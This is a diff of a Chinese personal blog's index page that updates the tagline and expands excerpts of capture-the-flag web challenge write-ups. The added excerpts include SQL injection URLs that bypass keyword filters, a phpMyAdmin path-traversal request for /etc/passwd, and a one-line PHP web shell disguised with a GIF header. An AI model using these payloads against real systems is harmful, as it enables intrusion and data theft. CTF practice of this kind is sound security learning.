@@ -82,12 +82,12 @@
 
 
 
-<meta name="description" content="人之所以能是相信能。">
+<meta name="description" content="人之所以能是因为相信能。">
 <meta property="og:type" content="website">
 <meta property="og:title" content="花间一壶酒">
 <meta property="og:url" content="http://example.com/page/4/index.html">
 <meta property="og:site_name" content="花间一壶酒">
-<meta property="og:description" content="人之所以能是相信能。">
+<meta property="og:description" content="人之所以能是因为相信能。">
 <meta property="og:locale">
 <meta property="article:author" content="徐行之">
 <meta name="twitter:card" content="summary">
@@ -162,7 +162,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">人之所以能是相信能。</p>
+        <p class="site-subtitle">人之所以能是因为相信能。</p>
       
   </div>
 
@@ -383,7 +383,11 @@
           
           [极客大挑战 2019]BabySQL发现该题使用replace()函数，查找到or、union和select等然后替换为空了。replace()函数直接使用双写绕过。
 11&#x27; oorr 1=1# //用户名
-爆当前数据库名/check.php?username=1&#39; uniuni
+爆当前数据库名/check.php?username=1&#39; uniunionon selselectect 1,2,database()%23&amp;password=123
+爆表
+1/check.php?username=1&#x27; uniunionon selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123
+发现原来information_schema里面也有个or，以此类推order by也不可。同时发现from、where、and等字段也被过滤了。
+1/check
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -536,7 +540,9 @@
         
           
           [CISCN 2019 初赛]Love Math
-1234567scandir() 函数：返回指定目录中的文件和目录的数组。base_convert() 函数：在任意进制之间转换数字。dechex() 函数：把十进制转换为十六进制。hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字
+1234567scandir() 函数：返回指定目录中的文件和目录的数组。base_convert() 函数：在任意进制之间转换数字。dechex() 函数：把十进制转换为十六进制。hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。var_dump() ：函数用于输出变量的相关信息。readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。语法：readfile(filename,include_path,context)
+需要绕后正则和白名单，最后通过eval执行php代码。类似于通过异或等运算构造payload，这里需要用到的是白名单里的math函数。
+ base_convert()函数通过构造base_convert(696468,10,36) 得到 base_
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -691,8 +697,12 @@
           [GWCTF 2019]我有一个数据库扫描目录phpmyadmin任意文件读取
 该版本存在远程文件读取漏洞读取passwd文件
 1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
-读取成功，
-          ...
+读取成功，尝试读取flag文件
+1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
+参考：phpmyadmin 4.8.1 远程文件包含漏洞
+phpMyAdmin 4.8.x 本地文件包含漏洞利用
+
+          
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/02/07/20210207/#more" rel="contents">
@@ -1004,7 +1014,7 @@ smarty模板注入
 123&lt;?php$flag = file_get_contents(&#x27;/flag&#x27;);
 
 index.php
-12345678910111213141516171819202
+12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;;foreach($_POST as $x =&gt; $y)&#123;    $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123;    $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123;    if($_GET[&#x27
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1157,7 +1167,7 @@ index.php
         
           
           [网鼎杯 2018]Fakebook扫描目录，发现user.php.bak打开有
-1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123;  
+1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)    &#123;        $ch = curl_
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1310,7 +1320,7 @@ index.php
         
           
           [BJDCTF2020]ZJCTF，不过如此base64解码
-1234567891011121314151617181920&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re
+1234567891011121314151617181920&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\1&quot;)&#x27;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;	@eval($_GET[&#x27;cmd&#x27;]
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1463,7 +1473,7 @@ index.php
         
           
           [MRCTF2020]Ez_bypass查看源码
-123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php#I put something in F12 for youinclude &#x
+123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php#I put something in F12 for youinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;    $id=$_GET[&#x27;id&#x27;];    $gg=$_GET[&#x27;gg&#x27;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#x27;You g
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -1615,8 +1625,14 @@ index.php
       
         
           
-          [GXYCTF2019]BabyUpload尝试上传一句话木马，但.jpg，.png，诸如此类都不行。且这道题不知道为什么，我这里只有用将一句话木马后缀改成png的时候才能用菜刀之类的连上，jpg后缀都不行。先上传.htaccess文件之后上传0.png文件，由于文件内容会过滤&lt;?所以就用js
-          ...
+          [GXYCTF2019]BabyUpload尝试上传一句话木马，但.jpg，.png，诸如此类都不行。且这道题不知道为什么，我这里只有用将一句话木马后缀改成png的时候才能用菜刀之类的连上，jpg后缀都不行。先上传.htaccess文件之后上传0.png文件，由于文件内容会过滤&lt;?所以就用js引用php绕过。
+12GIF89a&lt;script language=&#x27;php&#x27;&gt;eval($_POST[0]);&lt;/script&gt;
+
+
+上传成功连接蚁剑，在根目录找到flag
+
+
+          
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2021/02/01/20210201/#more" rel="contents">
@@ -1769,7 +1785,8 @@ index.php
           
           [ZJCTF 2019]NiZhuanSiWeitext变量可以用php://input绕过利用php伪协议filter读取useless.php
 base64解码得到
-12345678910111213&lt;?php  class Flag&#123;  //flag.php      publ
+12345678910111213&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  
+先进行序列化，得到序列化后字
           ...
           <!--noindex-->
           <div class="post-button text-center">
